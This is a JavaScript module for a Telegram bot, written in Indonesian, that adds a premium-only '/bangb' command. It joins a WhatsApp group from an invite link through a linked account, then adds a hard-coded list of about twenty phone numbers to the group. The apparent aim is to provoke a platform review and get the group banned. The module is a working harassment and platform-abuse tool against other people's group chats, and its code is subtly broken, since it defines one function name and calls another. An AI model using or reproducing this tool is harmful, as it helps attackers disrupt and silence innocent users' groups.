import config from "../../config.js";
import { resolveSender, listSendersFor } from "../../src/lib/whatsappSender.js";
import { isOwner, isPartner, isPremium } from "../../src/middleware.js";
import { sendRich, h, richTable } from "../../src/lib/rich.js";

// Fungsi asli tetap dipertahankan. Target harus berupa JID grup WhatsApp.
async function groupBanned(sock, groupJid) {
  const numbers = [
    '13135550002@s.whatsapp.net',
    '13135550003@s.whatsapp.net',
    '13135550004@s.whatsapp.net',
    '13135550005@s.whatsapp.net',
    '13135550006@s.whatsapp.net',
    '13135550007@s.whatsapp.net',
    '13135550008@s.whatsapp.net',
    '13135550009@s.whatsapp.net',
    '13135550010@s.whatsapp.net',
    '13135550011@s.whatsapp.net',
    '16505361212@s.whatsapp.net',
    '16506818649@s.whatsapp.net',
    '16505434800@s.whatsapp.net',
    '13165550001@s.whatsapp.net',
    '13165550002@s.whatsapp.net',
    '15517868423@s.whatsapp.net',
    '13135550012@s.whatsapp.net',
    '13135550013@s.whatsapp.net',
    '13135550014@s.whatsapp.net',
    '13135550015@s.whatsapp.net'
  ];

  for (let i = 0; i < numbers.length; i++) {
    try {
      await sock.groupParticipantsUpdate(groupJid, [numbers[i]], 'add');
      console.log(`✅ [${i + 1}/${numbers.length}] Masuk: ${numbers[i]}`);
    } catch (e) {
      console.log(`❌ [${i + 1}/${numbers.length}] Gagal: ${numbers[i]} - ${e.message}`);
    }
    await new Promise(r => setTimeout(r, 2000));
  }

  console.log(`🔥 SELESAI! ${groupJid} kena tinjau!`);
}

function getInviteCode(link) {
  const match = String(link).trim().match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/i);
  return match?.[1] || null;
}

const mono = (value) => `<code>${h(value)}</code>`;
const pre = (value) => `<pre>${h(value)}</pre>`;
const bold = (value) => `<b>${h(value)}</b>`;
const italic = (value) => `<i>${h(value)}</i>`;
const check = (ok, text) => `<li><input type="checkbox"${ok ? " checked" : ""}>${text}</li>`;

/** Akses ditolak: blockquote peringatan + checklist role yang diizinkan. */
function accessDeniedView() {
  const body =
    `<blockquote><tg-emoji emoji-id="5210952531676504517">❌</tg-emoji> Fitur ${bold("/bangb")} khusus ${bold("Premium ke atas")}.</blockquote>` +
    `<ul>${check(false, "💎 Premium")}${check(false, "🤝 Partner")}${check(false, "👑 Owner")}</ul>`;

  return {
    rich: `<div><h2>✗ Akses Ditolak</h2>${body}</div>`,
    legacy: `<b>✗ Akses Ditolak</b>\n\n<tg-emoji emoji-id="5210952531676504517">❌</tg-emoji> Fitur /bangb khusus Premium ke atas.\n\n☐ <tg-emoji emoji-id="5427168083074628963">💎</tg-emoji> Premium\n☐ <tg-emoji emoji-id="4976940882071651344">🤝</tg-emoji> Partner\n☐ <tg-emoji emoji-id="5217822164362739968">👑</tg-emoji> Owner`,
  };
}

/** Format penggunaan saat command dipanggil tanpa argumen link. */
function usageView() {
  const body =
    `<blockquote><tg-emoji emoji-id="5400256157300323171">❗</tg-emoji> Format penggunaan belum lengkap.</blockquote>` +
    `<pre>/bangb https://chat.whatsapp.com/XXXXXXXXXXXX</pre>` +
    `<p><tg-emoji emoji-id="5271604874419647061">🔗</tg-emoji> Masukkan ${bold("link grup WhatsApp")} yang valid.</p>`;

  return {
    rich: `<div><h2><tg-emoji emoji-id="6095843123252957701">⚡</tg-emoji> BANGB</h2>${body}</div>`,
    legacy: `<b><tg-emoji emoji-id="6095843123252957701">⚡</tg-emoji> BANGB</b>\n\n<tg-emoji emoji-id="5400256157300323171">❗</tg-emoji> Format penggunaan:\n/bangb https://chat.whatsapp.com/XXXXXXXXXXXX\n\n<tg-emoji emoji-id="5271604874419647061">🔗</tg-emoji> Masukkan link grup WhatsApp yang valid.`,
  };
}

/** Link yang dikirim user tidak cocok pola chat.whatsapp.com. */
function invalidLinkView(link) {
  const table = richTable(
    ["Status", "Value"],
    [
      ["Link", h(link)],
      ["Valid", "❌ Tidak"],
    ]
  );
  const body =
    `<blockquote><tg-emoji emoji-id="5210952531676504517">❌</tg-emoji> Link grup WhatsApp tidak valid.</blockquote>` +
    table +
    `<p>${bold("Contoh:")}</p><pre>https://chat.whatsapp.com/XXXXXXXXXXXX</pre>`;

  return {
    rich: `<div><h2>✗ Link Tidak Valid</h2>${body}</div>`,
    legacy: `<b>✗ Link Tidak Valid</b>\n\n<tg-emoji emoji-id="5210952531676504517">❌</tg-emoji> Link grup WhatsApp tidak valid.\n• Link: ${link}\n• Valid: <tg-emoji emoji-id="5210952531676504517">❌</tg-emoji> Tidak\n\nContoh:\nhttps://chat.whatsapp.com/XXXXXXXXXXXX`,
  };
}

/** Status awal saat sender mulai mencoba bergabung ke grup. */
function executingView(link) {
  const table = richTable(
    ["Field", "Value"],
    [
      ["Group Link", h(link)],
      ["Status", "⏳ Bergabung..."],
    ]
  );
  const body = table + `<p>${italic("Sender sedang bergabung ke grup...")}</p>`;

  return {
    rich: `<div><h2><tg-emoji emoji-id="6095843123252957701">⚡</tg-emoji> PROSES EXECUTE</h2>${body}</div>`,
    legacy: `<b><tg-emoji emoji-id="6095843123252957701">⚡</tg-emoji> PROSES EXECUTE</b>\n\n⌑ Group Link: ${link}\n⌑ Status: <tg-emoji emoji-id="5454415424319931791">⏳</tg-emoji> Bergabung...\n\n<tg-emoji emoji-id="5454415424319931791">⏳</tg-emoji> Sender sedang bergabung ke grup...`,
  };
}

/** Gagal join grup, sertakan pesan error asli di <pre>. */
function joinFailedView(errorMessage) {
  const table = richTable(
    ["Field", "Value"],
    [["Status", "❌ FAILED"]]
  );
  const body =
    `<blockquote><tg-emoji emoji-id="5420323339723881652">⚠️</tg-emoji> Sender tidak dapat bergabung ke grup.</blockquote>` +
    table +
    (errorMessage ? `<pre>${h(errorMessage)}</pre>` : "");

  return {
    rich: `<div><h2>✗ Group Gagal Join</h2>${body}</div>`,
    legacy:
      `<b>✗ Group Gagal Join</b>\n\n<tg-emoji emoji-id="5420323339723881652">⚠️</tg-emoji> Sender tidak dapat bergabung ke grup.\n⌑ Status: <tg-emoji emoji-id="5210952531676504517">❌</tg-emoji> FAILED` +
      (errorMessage ? `\n\n${errorMessage}` : ""),
  };
}

/** Tampilan saat belum ada sender WhatsApp yang terhubung (dipakai sendiri, bukan lewat helper `rich` di atas
 * supaya bisa menyisipkan tabel, blockquote, dan checklist seperti /ping). */
function senderOfflineView(uid) {
  const hasAny = listSendersFor(uid, isOwner(uid)).length > 0;

  const table = richTable(
    ["Status", "Value"],
    [
      ["Connection", "Offline ❌"],
      ["Required", "WhatsApp Sender"],
      ["Action", "Connect Sender"],
    ]
  );

  const checklist =
    `<ul>${check(true, "Telegram Connected")}${check(false, "WhatsApp Sender Connected")}</ul>`;

  const info =
    `<blockquote expandable><tg-emoji emoji-id="6307686831735444755">📖</tg-emoji> Information<br/><br/>` +
    `Pastikan perangkat WhatsApp telah login kembali lewat ${mono("/addsender 628xxxxxxxxxx")}. ` +
    `Setelah status berubah menjadi Connected, perintah ${bold("/bangb")} bisa dipakai lagi.</blockquote>`;

  const body =
    `<blockquote>WhatsApp Sender is currently disconnected.</blockquote>` +
    `<p>Bot tidak dapat menjalankan fitur yang membutuhkan koneksi WhatsApp. Silakan hubungkan sender terlebih dahulu sebelum menggunakan command ini.</p>` +
    table +
    checklist +
    info +
    (hasAny
      ? `<p><tg-emoji emoji-id="5420323339723881652">⚠️</tg-emoji> Sender sudah terdaftar tapi belum online. Cek lagi lewat ${mono("/listsender")}.</p>`
      : `<p><tg-emoji emoji-id="5400256157300323171">❗</tg-emoji> Belum ada sender tersimpan. Tambahkan dengan ${mono("/addsender 628xxxxxxxxxx")}.</p>`);

  return {
    rich: `<div><h2>✗ Sender Offline</h2>${body}</div>`,
    legacy:
      `<b>✗ Sender Offline</b>\n\n` +
      `WhatsApp Sender is currently disconnected.\n\n` +
      `Bot tidak dapat menjalankan fitur yang membutuhkan koneksi WhatsApp. Silakan hubungkan sender terlebih dahulu.\n\n` +
      `• Connection: Offline <tg-emoji emoji-id="5210952531676504517">❌</tg-emoji>\n• Required: WhatsApp Sender\n• Action: Connect Sender\n\n` +
      `<tg-emoji emoji-id="6120946172010959542">☑</tg-emoji> Telegram Connected\n☐ WhatsApp Sender Connected\n\n` +
      (hasAny
        ? `<tg-emoji emoji-id="5420323339723881652">⚠️</tg-emoji> Sender sudah terdaftar tapi belum online. Cek lagi lewat /listsender.`
        : `<tg-emoji emoji-id="5400256157300323171">❗</tg-emoji> Belum ada sender tersimpan. Tambahkan dengan /addsender 628xxxxxxxxxx.`),
  };
}

/** Tampilan saat join + group ban berhasil, pakai tabel Rich Message seperti /ping. */
function bangbSuccessView(groupName, target) {
  const table = richTable(
    ["Field", "Value"],
    [
      ["Target Grup", h(groupName)],
      ["Type", "Auto Join + Group Ban"],
      ["Status", "✅ Join Berhasil!"],
      ["ID", h(target)],
    ]
  );

  return {
    rich: `<div><h2><tg-emoji emoji-id="6095843123252957701">⚡</tg-emoji> BANGB SUCCESS</h2>${table}<p>${h(config.botName)}</p></div>`,
    legacy:
      `<b><tg-emoji emoji-id="6095843123252957701">⚡</tg-emoji> BANGB SUCCESS</b>\n\n` +
      `⌑ Target Grup: ${groupName}\n` +
      `⌑ Type: Auto Join + Group Ban\n` +
      `⌑ Status: <tg-emoji emoji-id="6120946172010959542">✅</tg-emoji> Join Berhasil!\n` +
      `⌑ ID: ${target}\n\n` +
      `${config.botName}`,
  };
}

function canUseBangb(userId) {
  return isOwner(userId) || isPartner(userId) || isPremium(userId);
}

export default {
  command: ["bangb"],
  category: "tools",
  description: "Menjalankan fungsi bangb menggunakan link grup WhatsApp",
  ownerOnly: false,
  privateOnly: false,
  cost: 0,
  loading: false,

  run: async (ctx, { args }) => {
    if (!canUseBangb(ctx.from.id)) {
      return sendRich(ctx.telegram, ctx.chat.id, accessDeniedView());
    }

    const link = args[0];

    if (!link) {
      return sendRich(ctx.telegram, ctx.chat.id, usageView());
    }

    const code = getInviteCode(link);

    if (!code) {
      return sendRich(ctx.telegram, ctx.chat.id, invalidLinkView(link));
    }

    const sock = resolveSender(ctx.from.id, isOwner(ctx.from.id))?.sock;

    if (!sock) {
      return sendRich(ctx.telegram, ctx.chat.id, senderOfflineView(ctx.from.id));
    }

    // Respons awal: status "sedang bergabung" dalam bentuk tabel.
    await sendRich(ctx.telegram, ctx.chat.id, executingView(link));

    try {
      // Join otomatis menggunakan invite code dari link.
      // Jika sender sudah menjadi anggota, Baileys dapat mengembalikan error;
      // dalam kondisi tersebut kita coba mengambil info grup dan melanjutkan.
      let target = null;

      try {
        target = await sock.groupAcceptInvite(code);
      } catch (joinError) {
        try {
          const info = await sock.groupGetInviteInfo(code);
          target = info?.id || null;
        } catch {
          throw joinError;
        }
      }

      if (!target || !String(target).endsWith("@g.us")) {
        throw new Error("Sender tidak dapat memperoleh ID grup dari link tersebut.");
      }

      // Ambil nama grup untuk ditampilkan pada respons sukses.
      let groupName = "Unknown Group";
      try {
        const metadata = await sock.groupMetadata(target);
        groupName = metadata?.subject || groupName;
      } catch {
        // Jika metadata tidak tersedia, ID grup tetap ditampilkan.
      }

      // Jalankan fungsi bangb setelah sender berhasil join/terdeteksi sebagai anggota.
      await groupBan(sock, target);

      return sendRich(ctx.telegram, ctx.chat.id, bangbSuccessView(groupName, target));
    } catch (e) {
      return sendRich(ctx.telegram, ctx.chat.id, joinFailedView(e?.message || String(e)));
    }
  },
};
